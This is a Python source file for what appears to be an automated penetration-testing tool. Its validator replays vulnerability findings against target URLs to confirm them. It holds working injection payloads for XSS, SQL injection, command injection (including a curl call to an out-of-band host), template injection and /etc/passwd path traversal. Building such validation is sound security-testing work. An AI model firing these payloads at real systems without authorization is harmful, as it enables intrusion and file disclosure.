"""
Validator — Zero-False-Positive Replay Validation

Validators enforce safety; no finding without proof. Deterministic replay,
no LLM.

Takes confirmed solver findings (confidence >= 0.72) and replays them
with independent verification methods to eliminate false positives.

Each vuln type has a dedicated validation strategy:
  - XSS:  replay payload via http_probe, check reflection in response
  - SQLi: timing differential (SLEEP variant), boolean differential (1=1 vs 1=2)
  - SSRF: unique OOB token, replay, poll for callback
  - RCE:  OOB callback or unique canary in response body
  - SSTI: math eval check (7*7=49 in response)
  - LFI:  check for /etc/passwd pattern (root:x:0:0)
  - Generic: JIT replay script

Called by Coordinator after Step 5 (filter confirmed).
Only findings that pass validation are kept as true positives.
"""

import asyncio
import json
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from loguru import logger


@dataclass
class ValidationTask:
    """Input for the validator — one confirmed solver finding."""
    task_id: str
    target_url: str
    parameter: str
    vuln_type: str
    method: str = "GET"
    working_payload: str = ""
    proof_response: str = ""
    injection_type: str = ""
    confidence: float = 0.0
    raw_result: Optional[Dict] = None


@dataclass
class ValidationResult:
    """Output from the validator."""
    task_id: str
    validated: bool = False
    false_positive: bool = False
    validation_method: str = ""
    evidence: str = ""
    replay_status: int = 0
    replay_time_ms: float = 0.0


class ValidatorAgent:
    """
    Replays confirmed findings with independent verification.

    Reuses http_probe tool for HTTP replay and OOBServer for blind validation.
    No LLM calls — pure deterministic verification.
    SQLi timing threshold and XSS headless visit configurable.
    """

    def __init__(
        self,
        oob_server=None,
        jit_engine=None,
        sqli_timing_threshold_ms: float = 4000.0,
        rce_timing_threshold_ms: float = 4000.0,
        xss_use_headless: bool = False,
    ):
        self.oob = oob_server
        self.jit = jit_engine
        self._sqli_timing_threshold_ms = sqli_timing_threshold_ms
        self._rce_timing_threshold_ms = rce_timing_threshold_ms
        self._xss_use_headless = xss_use_headless

    async def validate(self, task: ValidationTask) -> ValidationResult:
        """Dispatch to vuln-specific validator."""
        validators = {
            "xss": self._validate_xss,
            "xss_reflected": self._validate_xss,
            "xss_stored": self._validate_xss,
            "sqli": self._validate_sqli,
            "sql_injection": self._validate_sqli,
            "ssrf": self._validate_ssrf,
            "rce": self._validate_rce,
            "command_injection": self._validate_rce,
            "ssti": self._validate_ssti,
            "template_injection": self._validate_ssti,
            "lfi": self._validate_lfi,
            "path_traversal": self._validate_lfi,
        }

        validator_fn = validators.get(task.vuln_type, self._validate_generic)

        try:
            result = await validator_fn(task)
            log_fn = logger.success if result.validated else logger.warning
            log_fn(
                f"[Validator] {task.task_id}: {task.vuln_type} @ {task.target_url} "
                f"→ {'VALID' if result.validated else 'FALSE POSITIVE'} "
                f"via {result.validation_method}"
            )
            return result
        except Exception as e:
            logger.error(f"[Validator] {task.task_id}: validation error — {e}")
            return ValidationResult(
                task_id=task.task_id,
                validated=False,
                false_positive=False,
                validation_method="error",
                evidence=str(e),
            )

    # ── XSS Validation ──────────────────────────────────────────────────────

    async def _validate_xss(self, task: ValidationTask) -> ValidationResult:
        """Replay XSS payload, check if it appears unescaped in response. Optional headless visit."""
        canary = f"xlv_{uuid.uuid4().hex[:8]}"
        xss_payload = task.working_payload or f'"><img src=x onerror=alert("{canary}")>'

        if self._xss_use_headless:
            # Optional: headless browser visit to trigger DOM/JS execution
            headless_ok = await self._xss_headless_visit(
                task.target_url, task.method, task.parameter, xss_payload, canary
            )
            if headless_ok:
                return ValidationResult(
                    task_id=task.task_id,
                    validated=True,
                    false_positive=False,
                    validation_method="xss_headless_visit",
                    evidence="canary or payload executed in headless browser",
                )

        resp = await self._replay_request(
            task.target_url, task.method, task.parameter, xss_payload
        )
        if not resp:
            return ValidationResult(
                task_id=task.task_id, validation_method="xss_replay",
                evidence="replay_failed",
            )

        body = resp.get("body_snippet", "")
        reflected = xss_payload in body or (canary in body and "onerror" in body)

        return ValidationResult(
            task_id=task.task_id,
            validated=reflected,
            false_positive=not reflected,
            validation_method="xss_reflection_check",
            evidence=body[:500] if reflected else "payload_escaped_or_missing",
            replay_status=resp.get("status_code", 0),
            replay_time_ms=resp.get("elapsed_ms", 0),
        )

    async def _xss_headless_visit(
        self, url: str, method: str, parameter: str, payload: str, canary: str
    ) -> bool:
        """Optional headless browser visit; returns True if alert/execution detected."""
        try:
            from xlayer_ai.tools.browser import HeadlessBrowser
            async with HeadlessBrowser() as browser:
                result = await browser.execute_xss(url=url, payload=payload, parameter=parameter)
                if result and (result.success or result.alert_triggered):
                    return True
        except Exception as e:
            logger.debug(f"[Validator] XSS headless visit failed: {e}")
        return False

    # ── SQLi Validation ─────────────────────────────────────────────────────

    async def _validate_sqli(self, task: ValidationTask) -> ValidationResult:
        """Timing differential: SLEEP(5) vs SLEEP(0), or boolean: 1=1 vs 1=2."""

        # Strategy 1: Time-based
        sleep_payload = "' OR SLEEP(5)-- -"
        nosleep_payload = "' OR SLEEP(0)-- -"

        resp_slow = await self._replay_request(
            task.target_url, task.method, task.parameter, sleep_payload
        )
        resp_fast = await self._replay_request(
            task.target_url, task.method, task.parameter, nosleep_payload
        )

        if resp_slow and resp_fast:
            t_slow = resp_slow.get("elapsed_ms", 0)
            t_fast = resp_fast.get("elapsed_ms", 0)
            diff_ms = t_slow - t_fast

            if diff_ms >= self._sqli_timing_threshold_ms:
                return ValidationResult(
                    task_id=task.task_id,
                    validated=True,
                    validation_method="sqli_time_based",
                    evidence=f"SLEEP(5)={t_slow:.0f}ms, SLEEP(0)={t_fast:.0f}ms, diff={diff_ms:.0f}ms",
                    replay_status=resp_slow.get("status_code", 0),
                    replay_time_ms=t_slow,
                )

        # Strategy 2: Boolean-based
        true_payload = "' OR '1'='1"
        false_payload = "' OR '1'='2"

        resp_true = await self._replay_request(
            task.target_url, task.method, task.parameter, true_payload
        )
        resp_false = await self._replay_request(
            task.target_url, task.method, task.parameter, false_payload
        )

        if resp_true and resp_false:
            len_true = resp_true.get("content_length", 0)
            len_false = resp_false.get("content_length", 0)
            body_true = resp_true.get("body_snippet", "")
            body_false = resp_false.get("body_snippet", "")

            # Significant length difference or content difference
            len_diff = abs(len_true - len_false)
            if len_diff > 50 and body_true != body_false:
                return ValidationResult(
                    task_id=task.task_id,
                    validated=True,
                    validation_method="sqli_boolean_diff",
                    evidence=f"1=1 len={len_true}, 1=2 len={len_false}, diff={len_diff}",
                    replay_status=resp_true.get("status_code", 0),
                    replay_time_ms=resp_true.get("elapsed_ms", 0),
                )

        return ValidationResult(
            task_id=task.task_id,
            false_positive=True,
            validation_method="sqli_timing+boolean",
            evidence="no_differential_detected",
        )

    # ── SSRF Validation ─────────────────────────────────────────────────────

    async def _validate_ssrf(self, task: ValidationTask) -> ValidationResult:
        """Replay with unique OOB token, poll for callback."""
        if not self.oob or not self.oob.available:
            return await self._validate_generic(task)

        token = self.oob.new_token()
        oob_url = self.oob.http_url(token)

        await self._replay_request(
            task.target_url, task.method, task.parameter, oob_url
        )

        # Poll for OOB callback
        hits = await self.oob.wait_for_hit(token=token, timeout=15)

        return ValidationResult(
            task_id=task.task_id,
            validated=bool(hits),
            false_positive=not bool(hits),
            validation_method="ssrf_oob_callback",
            evidence=str(hits[0]) if hits else "no_oob_callback",
        )

    # ── RCE Validation (timing → OOB → echo order) ───────────────────────────

    async def _validate_rce(self, task: ValidationTask) -> ValidationResult:
        """RCE probe sequence: 1) timing (sleep), 2) OOB callback, 3) echo canary."""
        canary = f"xlvrce{uuid.uuid4().hex[:8]}"

        # Strategy 1: Timing-based (non-destructive probe first)
        sleep_payload = "; sleep 5"
        no_sleep_payload = "; sleep 0"
        resp_slow = await self._replay_request(
            task.target_url, task.method, task.parameter, sleep_payload
        )
        resp_fast = await self._replay_request(
            task.target_url, task.method, task.parameter, no_sleep_payload
        )
        if resp_slow and resp_fast:
            t_slow = resp_slow.get("elapsed_ms", 0)
            t_fast = resp_fast.get("elapsed_ms", 0)
            if t_slow - t_fast >= self._rce_timing_threshold_ms:
                return ValidationResult(
                    task_id=task.task_id,
                    validated=True,
                    validation_method="rce_timing",
                    evidence=f"sleep(5)={t_slow:.0f}ms vs sleep(0)={t_fast:.0f}ms, diff={t_slow - t_fast:.0f}ms",
                    replay_status=resp_slow.get("status_code", 0),
                    replay_time_ms=t_slow,
                )

        # Strategy 2: OOB callback
        if self.oob and self.oob.available:
            token = self.oob.new_token()
            oob_url = self.oob.http_url(token)
            curl_payload = f"; curl {oob_url}"
            await self._replay_request(
                task.target_url, task.method, task.parameter, curl_payload
            )
            hits = await self.oob.wait_for_hit(token=token, timeout=15)
            if hits:
                return ValidationResult(
                    task_id=task.task_id,
                    validated=True,
                    validation_method="rce_oob_callback",
                    evidence=str(hits[0]),
                )

        # Strategy 3: Echo canary in response
        echo_payload = f"; echo {canary}"
        resp = await self._replay_request(
            task.target_url, task.method, task.parameter, echo_payload
        )
        if resp and canary in resp.get("body_snippet", ""):
            return ValidationResult(
                task_id=task.task_id,
                validated=True,
                validation_method="rce_echo_canary",
                evidence=f"canary '{canary}' found in response",
                replay_status=resp.get("status_code", 0),
                replay_time_ms=resp.get("elapsed_ms", 0),
            )

        return ValidationResult(
            task_id=task.task_id,
            false_positive=True,
            validation_method="rce_timing+oob+echo",
            evidence="no_timing_oob_or_echo",
        )

    # ── SSTI Validation ─────────────────────────────────────────────────────

    async def _validate_ssti(self, task: ValidationTask) -> ValidationResult:
        """Math eval check: inject {{7*7}} and look for 49."""
        payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
        ]

        for tpl_payload, expected in payloads:
            resp = await self._replay_request(
                task.target_url, task.method, task.parameter, tpl_payload
            )
            if resp and expected in resp.get("body_snippet", ""):
                # Confirm it's not just literal text
                clean_resp = await self._replay_request(
                    task.target_url, task.method, task.parameter, "harmless_text"
                )
                if clean_resp and expected not in clean_resp.get("body_snippet", ""):
                    return ValidationResult(
                        task_id=task.task_id,
                        validated=True,
                        validation_method="ssti_math_eval",
                        evidence=f"payload={tpl_payload} → '{expected}' in response",
                        replay_status=resp.get("status_code", 0),
                        replay_time_ms=resp.get("elapsed_ms", 0),
                    )

        return ValidationResult(
            task_id=task.task_id,
            false_positive=True,
            validation_method="ssti_math_eval",
            evidence="no_math_eval_detected",
        )

    # ── LFI Validation ──────────────────────────────────────────────────────

    async def _validate_lfi(self, task: ValidationTask) -> ValidationResult:
        """Check for /etc/passwd content in response."""
        lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]

        for lfi_payload in lfi_payloads:
            resp = await self._replay_request(
                task.target_url, task.method, task.parameter, lfi_payload
            )
            if resp:
                body = resp.get("body_snippet", "")
                if "root:x:0:0:" in body or "root:0:0:" in body:
                    return ValidationResult(
                        task_id=task.task_id,
                        validated=True,
                        validation_method="lfi_passwd_check",
                        evidence=f"payload={lfi_payload}, /etc/passwd content found",
                        replay_status=resp.get("status_code", 0),
                        replay_time_ms=resp.get("elapsed_ms", 0),
                    )

        return ValidationResult(
            task_id=task.task_id,
            false_positive=True,
            validation_method="lfi_passwd_check",
            evidence="no_passwd_content",
        )

    # ── Generic Validation ──────────────────────────────────────────────────

    async def _validate_generic(self, task: ValidationTask) -> ValidationResult:
        """Replay the working payload, check for non-error response."""
        if not task.working_payload:
            return ValidationResult(
                task_id=task.task_id,
                false_positive=True,
                validation_method="generic_no_payload",
                evidence="no_working_payload_to_replay",
            )

        resp = await self._replay_request(
            task.target_url, task.method, task.parameter, task.working_payload
        )

        if resp and resp.get("status_code", 0) < 500:
            return ValidationResult(
                task_id=task.task_id,
                validated=True,
                validation_method="generic_replay",
                evidence=f"status={resp.get('status_code')}, non-error response",
                replay_status=resp.get("status_code", 0),
                replay_time_ms=resp.get("elapsed_ms", 0),
            )

        return ValidationResult(
            task_id=task.task_id,
            false_positive=True,
            validation_method="generic_replay",
            evidence=f"replay_failed_or_error: status={resp.get('status_code') if resp else 'N/A'}",
        )

    # ── HTTP Replay Helper ──────────────────────────────────────────────────

    async def _replay_request(
        self,
        url: str,
        method: str,
        parameter: str,
        payload: str,
    ) -> Optional[Dict]:
        """Send a single HTTP request with payload injected into parameter."""
        try:
            import httpx
            from xlayer_ai.tools.pacing import apply_pacing
            await apply_pacing()
            params = {parameter: payload} if method.upper() == "GET" else {}
            body = {parameter: payload} if method.upper() != "GET" else {}

            start = time.monotonic()
            async with httpx.AsyncClient(
                follow_redirects=True, timeout=20, verify=False
            ) as client:
                response = await client.request(
                    method=method.upper(),
                    url=url,
                    params=params or None,
                    json=body or None,
                )
            elapsed_ms = (time.monotonic() - start) * 1000

            return {
                "status_code": response.status_code,
                "elapsed_ms": round(elapsed_ms, 1),
                "content_length": len(response.content),
                "body_snippet": response.text[:5000],
                "headers": dict(response.headers),
            }
        except Exception as e:
            logger.debug(f"[Validator] replay error: {e}")
            return None
